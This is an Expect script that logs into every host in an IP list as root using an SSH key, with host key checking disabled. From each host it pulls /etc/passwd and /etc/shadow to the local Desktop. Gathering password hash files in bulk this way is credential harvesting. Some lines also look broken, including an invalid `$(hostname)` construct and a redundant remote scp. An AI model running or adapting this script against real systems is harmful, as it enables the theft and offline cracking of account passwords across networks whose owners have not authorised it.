#!/usr/bin/expect -f

set timeout 10
set ip_list "ips.txt"  ;# File containing list of IPs
set rsa_key "~/.ssh/id_rsa" ;# Path to your RSA private key
set local_dir "~/Desktop/" ;# Directory to save the files

# Open the file containing IPs
set fp [open $ip_list r]
while {[gets $fp ip] != -1} {
    spawn ssh -i $rsa_key -o StrictHostKeyChecking=no root@$ip

    expect {
        "No route to host" {
            puts "Skipping $ip: No route to host"
            continue
        }
        "Connection refused" {
            puts "Skipping $ip: Connection refused"
            continue
        }
        "Permission denied" {
            puts "Skipping $ip: Permission denied"
            continue
        }
        "root@" {
            send "hostname\n"
            expect -re "(.*)\n"
            set hostname $expect_out(1,string)
            send "scp -i $rsa_key /etc/passwd /etc/shadow root@$(hostname):/tmp/\n"
            expect "root@"
            send "exit\n"
        }
    }

    spawn scp -i $rsa_key root@$ip:/etc/passwd $local_dir/${hostname}_passwd
    expect "Permission denied" { puts "Skipping $ip: Cannot retrieve /etc/passwd" }

    spawn scp -i $rsa_key root@$ip:/etc/shadow $local_dir/${hostname}_shadow
    expect "Permission denied" { puts "Skipping $ip: Cannot retrieve /etc/shadow" }
}

close $fp
